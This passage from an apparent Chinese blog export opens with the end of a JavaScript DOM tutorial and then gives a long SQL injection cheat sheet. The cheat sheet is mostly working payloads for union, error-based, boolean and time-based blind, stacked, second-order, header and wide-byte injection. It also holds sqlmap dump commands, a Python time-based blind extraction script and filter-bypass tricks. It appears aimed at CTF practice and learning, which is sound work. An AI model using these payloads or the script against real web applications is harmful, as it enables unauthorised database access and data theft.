<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;div id=&quot;div1&quot;&gt;</span><br><span class="line">  &lt;p id=&quot;p1&quot;&gt;这是第一个段落。&lt;/p&gt;</span><br><span class="line">  &lt;p id=&quot;p2&quot;&gt;这是第二个段落。&lt;/p&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">  // 获取父元素 div1</span><br><span class="line">  var parentElement = document.getElementById(&quot;div1&quot;);</span><br><span class="line"></span><br><span class="line">  // 创建一个新的段落节点</span><br><span class="line">  var newParagraph = document.createElement(&quot;p&quot;);</span><br><span class="line">  newParagraph.innerText = &quot;这是一个新插入的段落。&quot;;</span><br><span class="line"></span><br><span class="line">  // 找到参考节点（p1）</span><br><span class="line">  var referenceNode = document.getElementById(&quot;p1&quot;);</span><br><span class="line"></span><br><span class="line">  // 将新段落插入到 p1 之前</span><br><span class="line">  parentElement.insertBefore(newParagraph, referenceNode);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<h3 id="移除已存在的元素"><a href="#移除已存在的元素" class="headerlink" title="移除已存在的元素"></a>移除已存在的元素</h3><p>HTML 文档中 <code>&lt;div&gt;</code> 元素包含两个子节点 (两个 <code>&lt;p&gt;</code> 元素):</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;div id=&quot;div1&quot;&gt;</span><br><span class="line">&lt;p id=&quot;p1&quot;&gt;这是一个段落。&lt;/p&gt;</span><br><span class="line">&lt;p id=&quot;p2&quot;&gt;这是另外一个段落。&lt;/p&gt;</span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure>

<p>查找 id&#x3D;”div1” 的元素:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">var parent = document.getElementById(&quot;div1&quot;);</span><br></pre></td></tr></table></figure>

<p>查找 id&#x3D;”p1” 的 <code>&lt;p&gt;</code> 元素:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">var child = document.getElementById(&quot;p1&quot;);</span><br></pre></td></tr></table></figure>

<p>从父元素中移除子节点：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">parent.removeChild(child);</span><br></pre></td></tr></table></figure>

<blockquote>
<p>[!CAUTION]</p>
<p>删除节点必须知道父节点</p>
</blockquote>
<h3 id="替换-HTML-元素-replaceChild"><a href="#替换-HTML-元素-replaceChild" class="headerlink" title="替换 HTML 元素 - replaceChild()"></a>替换 HTML 元素 - replaceChild()</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;div id=&quot;div1&quot;&gt;</span><br><span class="line">&lt;p id=&quot;p1&quot;&gt;这是一个段落。&lt;/p&gt;</span><br><span class="line">&lt;p id=&quot;p2&quot;&gt;这是另外一个段落。&lt;/p&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line"> </span><br><span class="line">&lt;script&gt;</span><br><span class="line">var para = document.createElement(&quot;p&quot;);</span><br><span class="line">var node = document.createTextNode(&quot;这是一个新的段落。&quot;);</span><br><span class="line">para.appendChild(node);</span><br><span class="line"> </span><br><span class="line">var parent = document.getElementById(&quot;div1&quot;);</span><br><span class="line">var child = document.getElementById(&quot;p1&quot;);</span><br><span class="line">parent.replaceChild(para, child);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<h2 id="HTML-DOM-集合"><a href="#HTML-DOM-集合" class="headerlink" title="HTML DOM 集合"></a>HTML DOM 集合</h2><h3 id="HTML-Collection-对象"><a href="#HTML-Collection-对象" class="headerlink" title="HTML Collection 对象"></a>HTML Collection 对象</h3><p><code>getElementsByTagName()</code> 方法返回 HTMLCollection对象。</p>
<p>HTMLCollection 对象类似包含 HTML 元素的一个数组。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">var x = document.getElementsByTagName(&quot;p&quot;);</span><br></pre></td></tr></table></figure>

<p>集合中的元素可以通过索引(以 0 为起始位置)来访问。访问第二个 <code>&lt;p&gt;</code> 元素可以是以下代码:y &#x3D; x[1];</p>
<blockquote>
<p>[!NOTE]</p>
<p><strong>HTMLCollection 不是一个数组！</strong></p>
<p>但可以像数组一样，使用索引来获取元素</p>
</blockquote>
<h3 id="HTML-Collection-对象-length-属性"><a href="#HTML-Collection-对象-length-属性" class="headerlink" title="HTML Collection 对象 .length 属性"></a>HTML Collection 对象 .length 属性</h3><p> length 属性定义了集合中元素的数量</p>
<p>获取 <code>&lt;p&gt;</code> 元素的集合：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">var myCollection = document.getElementsByTagName(&quot;p&quot;);</span><br></pre></td></tr></table></figure>

<p>显示集合元素个数：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">document.getElementById(&quot;demo&quot;).innerHTML = myCollection.length;</span><br></pre></td></tr></table></figure>

<p>集合 length 属性常用于遍历集合中的元素。</p>
<h3 id="NodeList-对象"><a href="#NodeList-对象" class="headerlink" title="NodeList 对象"></a>NodeList 对象</h3><p><strong>NodeList</strong> 对象是一个从文档中获取的节点列表 (集合)</p>
<blockquote>
<p>[!CAUTION]</p>
<p>HTML Collection是 HTML 元素的集合。</p>
<p>NodeList 是一个文档节点的集合。</p>
<p>NodeList 与 HTMLCollection 都与数组对象有点类似，可以使用索引 (0, 1, 2, 3, 4, …) 来获取元素。</p>
<p>NodeList 与 HTMLCollection 都有 length 属性。</p>
<p>HTMLCollection 元素可以通过 name，id 或索引来获取。</p>
<p>NodeList 只能通过索引来获取。</p>
<p>只有 NodeList 对象有包含属性节点和文本节点。</p>
</blockquote>
]]></content>
      <categories>
        <category>前端</category>
      </categories>
  </entry>
  <entry>
    <title>SQL注入</title>
    <url>/2025/02/05/SQL%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><h2 id="注入姿势"><a href="#注入姿势" class="headerlink" title="注入姿势"></a>注入姿势</h2><h3 id="联合查询注入"><a href="#联合查询注入" class="headerlink" title="联合查询注入"></a>联合查询注入</h3><p><strong>1.寻找注入点（和数据库有交互的地方）与数据传输的类型</strong></p>
<p>登录，注册，搜索框</p>
<p><strong>2.判断闭合方式</strong> </p>
<p>先判断是数字型还是字符型</p>
<p>​	<code>?id=1asdf</code></p>
<p>​		数字型：报错</p>
<p>​		字符型：正常</p>
<p>再判断闭合方式（字符型）</p>
<p>​	<code>?id=1asdf</code>    (先加单引号，再加双引号，直到报错)</p>
<p>​	<img src="https://raw.githubusercontent.com/zkk1233/Picture/main/20250201165915494.png"></p>
<p>注意：<code>‘’</code>、<code>“”</code>、 <code>()</code>、<code>&#123;&#125;</code>都是成双成对</p>
<p>去掉头尾单引号，自己输入的内容右边的内容即为闭合方式（上例为单引号）</p>
<p><code>?id=1asdf</code>（先加闭合方式，再加–+注释，页面恢复正常）</p>
<p>验证输入内容数据库能否执行(加单引号让SQL语句发生错误，破坏SQL语句的完整性，没有达到SQL语句语法规则，从而判断可实现sql注入)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27; and 1=1 #有显示</span><br><span class="line"></span><br><span class="line">?id=1&#x27; and 1=2 #没显示</span><br></pre></td></tr></table></figure>

<p>需要注意的是，在测试删除功能时尽量不要使用<code>and 1=1</code>，否则可能会将数据全部删除</p>
<p><strong>3.判断列数</strong></p>
<p><strong><code>?id=1&#39; order by 3 #</code></strong></p>
<blockquote>
<p>[!IMPORTANT]</p>
<h4 id="order-by"><a href="#order-by" class="headerlink" title="order by"></a>order by</h4><p>默认按照升序对记录进行排序，可用desc关键字按照降序对记录进行排序</p>
<p>order by后面的列数大于实际的列数就会报错</p>
</blockquote>
<p>当<code>order by</code>无法使用时，可通过<code>select null</code>判断</p>
<p><strong><code>?id=1&#39; union select null,null,null  #</code></strong></p>
<p><strong>4.判断回显</strong>（假设3列）</p>
<p><strong><code>?id=-1&#39; union select 1,2,3 #</code></strong></p>
<p><strong>5.爆破数据</strong>(假设回显位为2)</p>
<p>数据库名</p>
<p><strong><code>?id=-1&#39; union select 1,database(),3 #</code></strong></p>
<p>查表名 </p>
<p><code>?id=-1&#39; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=&#39;库名&#39;),3 #</code>     或</p>
<p><code>?id=-1&#39; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database()),3 #</code>   或</p>
<p><strong><code>?id=-1&#39; union select 1, group_concat(table_name) ,3 from information_schema.tables where table_schema=database() #</code></strong></p>
<p>查列名</p>
<p><code>?id=-1&#39; union select 1,(select group_concat(column_name) from information_schema.columns where table_name=&#39;表名&#39;),3 #</code>  或</p>
<p><strong><code>?id=-1&#39; union select 1, group_concat(column_name) ,3 from information_schema.columns where table_name=&#39;表名&#39; #</code></strong></p>
<p>具体数据</p>
<p><code>?id=-1&#39; union select 1,(select group_concat(列名) from 表名),3 #</code>  或</p>
<p><strong><code>?id=-1 union select 1,列名 from 表名,3 #</code></strong></p>
<blockquote>
<p>[!IMPORTANT]</p>
<h4 id="一些默认数据库有关知识"><a href="#一些默认数据库有关知识" class="headerlink" title="一些默认数据库有关知识"></a>一些默认数据库有关知识</h4><p><code>table_schema</code>：数据库名</p>
<p><code>table_name</code>：表名</p>
<p><code>column_name</code>：列名</p>
<p><code>information_schema.tables</code>：数据库的表名</p>
<p><code>information_schema.columns</code>：数据库的列名</p>
</blockquote>
<blockquote>
<p>[!IMPORTANT]</p>
<h4 id="limit-m-n"><a href="#limit-m-n" class="headerlink" title="limit m,n"></a>limit m,n</h4><p>m：是指记录开始的位置，从0开始，表示第一条记录</p>
<p>n：是指取n条记录</p>
<p>limit 0,1 表示从第一条记录开始，表示取第一条记录</p>
</blockquote>
<blockquote>
<p>[!IMPORTANT]</p>
<h4 id="一些常见函数"><a href="#一些常见函数" class="headerlink" title="一些常见函数"></a>一些常见函数</h4><h5 id="concat：将多个字符串连成一个字符串"><a href="#concat：将多个字符串连成一个字符串" class="headerlink" title="concat：将多个字符串连成一个字符串"></a>concat：将多个字符串连成一个字符串</h5><p>concat(str1，str2)</p>
<p>返回结果为连接参数产生的字符串，如果有任何一个参数为null，则返回值为null</p>
<h5 id="group-concat-：将group-by产生的同一个分组中的值连接起来"><a href="#group-concat-：将group-by产生的同一个分组中的值连接起来" class="headerlink" title="group_concat()：将group by产生的同一个分组中的值连接起来"></a>group_concat()：将group by产生的同一个分组中的值连接起来</h5><p>返回一个字符串的结果该函数返回带有来自一个组的连接的非NULL值的字符串结果</p>
<p><code>group_concat( [distinct] 要连接的字段 [order by 排序字段 asc/desc] [separator &#39;分隔符&#39;])</code></p>
<p>distinct可以排除重复值，order by子句可以对结果中的值进行跑徐，separator是一个字符串值，缺省为一个逗号</p>
<h5 id="substr：用来截取数据库某个字段中的一部分"><a href="#substr：用来截取数据库某个字段中的一部分" class="headerlink" title="substr：用来截取数据库某个字段中的一部分"></a>substr：用来截取数据库某个字段中的一部分</h5><p><code>substr(string，start，length)</code></p>
<p>例如，获取 <code>column_name</code> 列的前 10 个字符</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select substr(列名, 1, 10) from 表名 </span><br></pre></td></tr></table></figure>

<p><code>substring(列名, 1, 10)</code>：从 <code>column_name</code> 的第 1 个字符开始，提取 10 个字符</p>
<p>如报错注入中</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;and extractvalue(1,concat(0x7e,(select substring(value,1,10) from flag ),0x7e)) #</span><br></pre></td></tr></table></figure>

<h5 id="ascii：返回字符串str最左边的数值"><a href="#ascii：返回字符串str最左边的数值" class="headerlink" title="ascii：返回字符串str最左边的数值"></a>ascii：返回字符串str最左边的数值</h5><p>ascii(str)</p>
</blockquote>
<h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><p>通过特殊函数错误使用并使其输出错误结果来获取信息</p>
<p>在遇有报错回显但没数据回显时可利用</p>
<blockquote>
<p>[!IMPORTANT]</p>
<h4 id="报错注入函数"><a href="#报错注入函数" class="headerlink" title="报错注入函数"></a>报错注入函数</h4><h5 id="floor-向下取整"><a href="#floor-向下取整" class="headerlink" title="floor():向下取整"></a>floor():向下取整</h5><p><code>?id=1&#39; and (select 1 from (select count(*),concat((select database() from information_schema.tables limit 0,1),floor(rand()*2))x from information_schema.tables group by x)a) #</code>    &#x2F;&#x2F;获取数据库名</p>
<h5 id="extractvalue-对XML文档进行查询的函数，当参数格式不正确而产生的错误，会返回参数的信息"><a href="#extractvalue-对XML文档进行查询的函数，当参数格式不正确而产生的错误，会返回参数的信息" class="headerlink" title="extractvalue():对XML文档进行查询的函数，当参数格式不正确而产生的错误，会返回参数的信息"></a><strong>extractvalue()</strong>:对XML文档进行查询的函数，当参数格式不正确而产生的错误，会返回参数的信息</h5><p>语法：<code>extractvalue(XML_document,XPath_string);</code></p>
<p>payload：<code>and (extractvalue(1,concat(0x7e,select database()),0x7e))</code></p>
<p>注：其一次只能查询32位长度</p>
<h5 id="updatexml-更新XML文档的函数，原理和extractvalue一样"><a href="#updatexml-更新XML文档的函数，原理和extractvalue一样" class="headerlink" title="updatexml():更新XML文档的函数，原理和extractvalue一样"></a><strong>updatexml()</strong>:更新XML文档的函数，原理和extractvalue一样</h5><p>语法：<code>updatexml(XML_document,XPath_string,new_value);</code></p>
<p>payload：<code>updatexml(1,concat(0x7e,(select database()),0x7e),1)</code></p>
<h5 id="exp-以e为底的指数函数"><a href="#exp-以e为底的指数函数" class="headerlink" title="exp():以e为底的指数函数"></a>exp():以e为底的指数函数</h5></blockquote>
<p>1.爆数据库名</p>
<p><code>and extractvalue(1,concat(0x7e,database(),0x7e)) #</code></p>
<p><strong><code>and updatexml(1,concat(0x7e,mid((select group_concat(schema_name) from information_schema.schemata),1,31)),1)</code></strong></p>
<p>2,爆表名</p>
<p><code>and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e)) #</code></p>
<p><strong><code>and updatexml(1, concat(0x7e, mid((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,31)),1) #</code></strong></p>
<p>3.爆列名</p>
<p><code>and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#39;表名&#39;),0x7e)) #</code></p>
<p><strong><code>and updatexml(1, concat(0x7e, mid((select group_concat(column_name) from information_schema.columns where table_name=&#39;表名&#39;),1,31)),1) #</code></strong></p>
<p>4.爆值</p>
<p><code>and extractvalue(1,concat(0x7e,(select group_concat(列1,0x3a,列2) from 表名),0x7e)) #</code></p>
<p><strong><code>updatexml(1, concat(0x7e, mid((select group_concat(列1,0x3a,列2) from 表名),1,31)),1) #</code></strong></p>
<h3 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h3><p><strong>看不到返回数据</strong>情况下通过差异（包括运行时间的差异和页面返回结果的差异）来判断</p>
<h4 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h4><p>在页面中，正确执行和错误执行SQL语句返回页面不一样，基于两种页面，来判断SQL语句正确与否，达到获取数据的目的</p>
<blockquote>
<p>[!IMPORTANT]</p>
<h4 id="几个盲注函数"><a href="#几个盲注函数" class="headerlink" title="几个盲注函数"></a>几个盲注函数</h4><h5 id="length-：返回字符串的长度"><a href="#length-：返回字符串的长度" class="headerlink" title="length()：返回字符串的长度"></a>length()：返回字符串的长度</h5><h5 id="limit-a-b-：a记录开始的偏移量，b是指从a-1条开始，取b条记录"><a href="#limit-a-b-：a记录开始的偏移量，b是指从a-1条开始，取b条记录" class="headerlink" title="limit(a,b)：a记录开始的偏移量，b是指从a+1条开始，取b条记录"></a>limit(a,b)：a记录开始的偏移量，b是指从a+1条开始，取b条记录</h5><h5 id="substr-：截取字符串"><a href="#substr-：截取字符串" class="headerlink" title="substr()：截取字符串"></a>substr()：截取字符串</h5><h5 id="ascii-：返回字符的ascii码，其同名函数ord用于过滤ascii的过滤"><a href="#ascii-：返回字符的ascii码，其同名函数ord用于过滤ascii的过滤" class="headerlink" title="ascii()：返回字符的ascii码，其同名函数ord用于过滤ascii的过滤"></a>ascii()：返回字符的ascii码，其同名函数ord用于过滤ascii的过滤</h5><h5 id="left-a-b-：从左侧截取a的前b位"><a href="#left-a-b-：从左侧截取a的前b位" class="headerlink" title="left(a,b)：从左侧截取a的前b位"></a>left(a,b)：从左侧截取a的前b位</h5><p>​		left((select database()),1)截取数据库名称第一位</p>
</blockquote>
<p>判断数据库的长度：<code>id=1 and (length(database())&gt;3)</code></p>
<p>判断数据库的具体名称：<code>id=1 and (ascii(substr(database(),x,1))&gt;110)</code></p>
<p>​					上例用来判断数据库名称的第x个字符的ascii码是否大于110这个值</p>
<p>判断表的个数：<code>id=1 and length((select table_name from information_schema.tables where table_schema=database() limit x,1))&gt;0</code></p>
<p>​			   上例若x&#x3D;0则用来判断是否存在表</p>
<p>判断表的长度：<code>id=1 and length((select table_name from information_schema.tables where table_schema=database() limit x,1))=4</code></p>
<p>​			    上例用来判断第（x+1）个表长度是否为4</p>
<p>判断表名：<code>id=1 and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit x,1),y,1))=110</code></p>
<p>​		    上例用来判断第（x+1）个表的第y个字符ascii码是否为110</p>
<p>判断列的个数：<code>id=1 and (select count(column_name) from information_schema.columns where table_name=&quot;flag&quot;)=1</code></p>
<p>​			  上例用来判断flag表的列数</p>
<p>判断列的长度：<code>id=1 and ascii(substr((select column_name from information_schema.columns where table_name = &quot;flag&quot;), 4,1))</code></p>
<p>判断列名：<code>id=1 and ascii(substr((select column_name from information_schema.columns where table_name = &quot;flag&quot;), 1,1))=102</code></p>
<p>查值（虚拟机中）：<code>sqlmap -r 1.txt --technique B -D web -T flag -C value --dump --level 3 --risk 3</code></p>
<h4 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h4><p>通过观察页面，既没有回显数据库内容，又没有报错信息也没有布尔类型状态</p>
<p><code>sleep()</code>：将程序挂起n秒后响应</p>
<p><code>if(expr1,expr2,expr3)</code>：如果expr1是true，则if()的返回值为expr2，否则返回值则为expr3</p>
<p>判断注入点：<code>1‘ and 1=1-- # 页面返回有数据</code>      或     <code>‘ and sleep(5)-- </code></p>
<p>​		       <code>1’ and 2=2-- # 页面返回有数据*</code></p>
<p>判断数据库的长度：<code>id=1 and if(length(database())=4,sleep(3),1)</code></p>
<p>判断数据库的具体名称：<code>id=1 and if(ascii(substr(database(),x,1))&gt;110,sleep(3),1)</code></p>
<p>判断表的个数<code>：id=1 and if((select count(table_name) from information_schema.tables where table_schema=database())=x,sleep(3),1)  //这里的x从1开始判断数据库中存在的表的数量</code></p>
<p>判断表名：<code>id=1 and if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit x,1),y,1))=110,sleep(3),1)</code></p>
<p>判断列的个数：<code>id=1 and if((select count(column_name) from information_schema.columns  where table_name=&#39;flag&#39;)=x,sleep(3),1)  //这里的x从1开始判断flag表中存在的字段数量</code></p>
<p>判断列名：<code>id=1 and if(ascii(substr((select column_name from information_schema.columns  where table_name=&#39;flag&#39;),x,1))=xxx,sleep(3),1)//这里的x是从1开始判断字段的位置，xxx对应了具体的ascii值</code></p>
<p>查值（虚拟机中）：<code>sqlmap -r 1.txt --technique T -D web -T flag -C value --dump --level 3 --risk 3</code></p>
<blockquote>
<p>[!TIP]</p>
<h4 id="时间盲注脚本"><a href="#时间盲注脚本" class="headerlink" title="时间盲注脚本"></a>时间盲注脚本</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">import string</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">#配置目标 URL 和基础信息</span><br><span class="line"></span><br><span class="line">url = &quot;........&quot;</span><br><span class="line">username_template = &quot;&#x27; or if((select substr(value,&#123;index&#125;,1) from flag)=&#x27;&#123;char&#125;&#x27;,sleep(3),0)#&quot;</span><br><span class="line">#填写payload</span><br><span class="line">password = &quot;0&quot;</span><br><span class="line"></span><br><span class="line">#用于测试的字符集（可以根据实际情况扩展）</span><br><span class="line"></span><br><span class="line">charset = string.ascii_letters + string.digits + &quot;&#123;&#125;_-&quot;</span><br><span class="line"></span><br><span class="line">def time_blind_injection():</span><br><span class="line">    extracted_value = &quot;&quot;</span><br><span class="line">    index = 1  # 从第1个字符开始</span><br><span class="line"></span><br><span class="line">    while True:</span><br><span class="line">        found = False</span><br><span class="line">        for char in charset:</span><br><span class="line">            payload = username_template.format(index=index, char=char)</span><br><span class="line">            start_time = time.time()</span><br><span class="line">            </span><br><span class="line">            # 发送 POST 请求</span><br><span class="line">            response = requests.post(url, data=&#123;&quot;username&quot;: payload, &quot;password&quot;: password&#125;)</span><br><span class="line">            elapsed_time = time.time() - start_time</span><br><span class="line">            </span><br><span class="line">            # 判断响应时间是否超过3秒</span><br><span class="line">            if elapsed_time &gt; 3:</span><br><span class="line">                extracted_value += char</span><br><span class="line">                print(f&quot;[+] Found character at position &#123;index&#125;: &#123;char&#125;&quot;)</span><br><span class="line">                found = True</span><br><span class="line">                break</span><br><span class="line">    </span><br><span class="line">        if not found:  # 如果在当前索引没有找到字符，说明到达字符串末尾</span><br><span class="line">            print(&quot;[+] Extraction complete!&quot;)</span><br><span class="line">            break</span><br><span class="line">    </span><br><span class="line">        index += 1</span><br><span class="line">    </span><br><span class="line">    return extracted_value</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    print(&quot;[*] Starting time-based blind SQL injection...&quot;)</span><br><span class="line">    result = time_blind_injection()</span><br><span class="line">    print(f&quot;[+] Extracted value: &#123;result&#125;&quot;)</span><br></pre></td></tr></table></figure>


</blockquote>
<h3 id="堆叠查询注入"><a href="#堆叠查询注入" class="headerlink" title="堆叠查询注入"></a>堆叠查询注入</h3><p>堆叠查询可以执行多条语句，多条语句间以分号隔开</p>
<p>如<code>id=1&#39;;update users set password=&#39;123456&#39; where id=1; #</code></p>
<p>例如php中的**mysql_multi_query()<strong>，pymysql中的</strong>cursor.execute()**支持多条sql语句同时执行</p>
<p>查数据库：<code>0&#39;;show databases;#</code></p>
<p>查表：<code>0&#39;;show tables;#</code></p>
<p>查列：<code>0&#39;;show columns from 表名;#</code>或<code>0&#39;;desc 列名;#</code></p>
<p>查数据(使用预处理语句)：<code>0&#39;;sEt@a=concat(&quot;sel&quot;,&quot;ect 列名 from 表名&quot;);PRepare hello from @a;execute hello;#</code>（select被绕过时，使用concat函数将select进行连接过滤）</p>
<p>注：表名前后都有  &#96;</p>
<h3 id="更新注入"><a href="#更新注入" class="headerlink" title="更新注入"></a>更新注入</h3><p>更新类的操作的返回结果都是布尔型，无法返回数据</p>
<p><code>insert into user(username,password,role) values(&#39;admin&#39; or updatexml(1, concat(0x7e, database(), 0x7e), 1) or &#39;&#39;, &#39;passwd&#39;, &#39;editor&#39;)</code><br><code>update user set password = &#39;kali123&#39; where id = 5 or extractvalue(1, concat(0x7e, version(), 0x7e));</code></p>
<h3 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h3><p>二次注入就是由于将数据存储进数据库中时未做好过滤，先提交构造好的特殊字符请求存储进数据库，然后提交第二次请求时与第一次提交进数据库中的字符发生了作用，形成了一条新的sql语句导致被执行</p>
<p>利用条件：知道数据库中的列名且使用了<code>magic_quote_gpc</code>等对引号过滤</p>
<p>例如存在注册和登录两个点击框，在注册的时候添加一些特殊字符，创建成功后，登录进行修改密码，发现报错语句，这里就可以判定是存在二次注入的，在注册的时候写入，然后再修改密码的地方修改密码后触发，这样就导致错误的输出，这里有错误的回显就可以使用报错注入来进行注入</p>
<p><code>admin1&quot;or(updatexml(1,concat(0x3a,(select(group_concat(table_name))from(information_schema.tables)where(table_schema=database()))),1))#</code></p>
<h3 id="HTTP头注入"><a href="#HTTP头注入" class="headerlink" title="HTTP头注入"></a>HTTP头注入</h3><p>HTTP头部注入是通过HTTP协议头部字段值进行注入，常存在于user-agent,cookie,referer,x-forwarded-for</p>
<h4 id="User-Agent注入"><a href="#User-Agent注入" class="headerlink" title="User-Agent注入"></a>User-Agent注入</h4><p>判断注入点：user-agent值后面加上<code>&#39;</code>，引发报错，确定存在sql注入</p>
<p>采用报错注入函数获取当前数据库名<code>‘ and updatexml(1,concat(0x7e,(database()),0x7e),0) and &#39;</code></p>
<h4 id="cookie注入"><a href="#cookie注入" class="headerlink" title="cookie注入"></a>cookie注入</h4><p>采用联合注入或报错注入</p>
<p><code>3 union select 1,group_concat(table_name) from information_schema.tables where table_schema=&#39;数据库名&#39;</code></p>
<p>剩下的就是需要查询表中的字段和字段的详细信息，和普通SQL注入同理</p>
<h4 id="Referer注入"><a href="#Referer注入" class="headerlink" title="Referer注入"></a>Referer注入</h4><h4 id="XFF注入"><a href="#XFF注入" class="headerlink" title="XFF注入"></a>XFF注入</h4><h3 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h3><p>可以看到addslashes或magic_quotes_gpc，设置了gbk编码</p>
<p>当访问id&#x3D;1’时，执行的SQL语句为：<code>SELECT * FROM users WHERE id=&#39;1\&#39;&#39;</code>，单引号被转义符“\”转义，所以在一般情况下，是无法注入的，但是由于数据库查询前执行了SET NAMES’ GBK’，将编码设置为宽字节GBK，所以是存在宽字节注入漏洞</p>
<p>原理：汉字url编码2位，利用汉字的一半编码与&#x2F;组合过滤</p>
<p>接着与正常注入步骤一样</p>
<p><code>?id=-1%df%27 union select 1,2,database()%23</code></p>
<p>但后续查表会出现单引号（但其会被转义），用嵌套查询</p>
<p><code>?id=20%df%27 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=(select database())%23</code></p>
<p><code>?id=20%df%27 union select 1,2,column_name from information_schema.columns where table_schema = (select database()) and table_name = (select table_name from information_schema.tables where table_schema = (select database())limit 0, 1)limit 0,1 %23</code> </p>
<h3 id="二次编码注入"><a href="#二次编码注入" class="headerlink" title="二次编码注入"></a>二次编码注入</h3><p>利用条件：目标站点使用了urldecode()解码</p>
<p><code>%</code>的url编码为：<code>%25</code><br><code>&#39;</code>的url编码为：<code>%27</code><br><code>%25%27</code>，URL解码后是<code>%27</code> 也就是<code>&#39;</code></p>
<h2 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h2><p><code>sqlmap -u (url) --dbs</code> 跑出数据库</p>
<p><code>sqlmap -u (url) -D 数据库名 --tables</code> 跑出指定数据</p>
<p><code>sqlmap -u (url) -D 数据库名 -T 表名 --columns</code> 跑出指定表的列名</p>
<p><code>sqlmap -u (url) -D 数据库名 -T 表名 -C 指定列 --dump</code> 跑出指定列中的值</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap --batch -u &quot;(网站url)&quot; --cookie=“···” </span><br></pre></td></tr></table></figure>

<p>-u：扫描目标url</p>
<p>–batch：自动处理提示信息</p>
<p>–cookie：附加cookie参数</p>
<p>获取当前数据库名：</p>
<p>​	–current-db：查询当前web使用的数据库名</p>
<p>​	-D：应用指定数据库</p>
<p>获取表名：</p>
<p>​	–tables：查询指定库下所有表名（先用-D指定库名）</p>
<p>​	-T：应用指定表</p>
<p>获取字段：</p>
<p>​	–columns：查询指定表下所有字段（先用-T指定名）</p>
<p>​	-C：应用指定字段名</p>
<p>获取数据：–dump</p>
<h2 id="绕过方式"><a href="#绕过方式" class="headerlink" title="绕过方式"></a>绕过方式</h2><h3 id="注释符"><a href="#注释符" class="headerlink" title="注释符"></a>注释符</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;#&#x27;, &#x27;--+&#x27;, &#x27;-- -&#x27;, &#x27;%23&#x27;, &#x27;%00&#x27;, &#x27;/**/&#x27;</span><br></pre></td></tr></table></figure>

<p><code>#</code>一般在post传参，<code>%23</code>一般在get传参</p>
<h3 id="and，or-过滤"><a href="#and，or-过滤" class="headerlink" title="and，or 过滤"></a>and，or 过滤</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 可以使用&quot;&amp;&amp;&quot;和&quot;||&quot;代替</span><br><span class="line">?id=1 &amp;&amp; 1=1 --+</span><br><span class="line"> </span><br><span class="line"># 盲注，异或运算相同为0，不同为1；根据返回值0，1判断</span><br><span class="line">?id=1 union select (substr(database(),1,1)=&#x27;s&#x27;) ^ 0 --</span><br></pre></td></tr></table></figure>

<h3 id="关键词绕过"><a href="#关键词绕过" class="headerlink" title="关键词绕过"></a>关键词绕过</h3><h4 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h4><p><code>id=-1&#39; UnIoN SeLeCT xxx</code></p>
<h4 id="双写绕过"><a href="#双写绕过" class="headerlink" title="双写绕过"></a>双写绕过</h4><p><code>id=-1&#39;UNIunionONSeLselectECT1,2,3–-</code></p>
<h4 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h4><p>可以使用URL，hex，ASCII等编码绕过</p>
<p>例如’or 1&#x3D;1可用<code>27%20%4F%52%201%3D%31%20%2D%2D</code></p>
<h4 id="注释绕过"><a href="#注释绕过" class="headerlink" title="注释绕过"></a>注释绕过</h4><p>内联注释&#x2F;**&#x2F;将关键词分隔开</p>
<p><code>id=1&#39; UN/**/ION SE/**/LECT database() --</code></p>
<h3 id="空格绕过"><a href="#空格绕过" class="headerlink" title="空格绕过"></a>空格绕过</h3><h4 id="内联注释代替空格"><a href="#内联注释代替空格" class="headerlink" title="内联注释代替空格"></a>内联注释代替空格</h4><p><code>id=1/**/and/**/1=1</code></p>
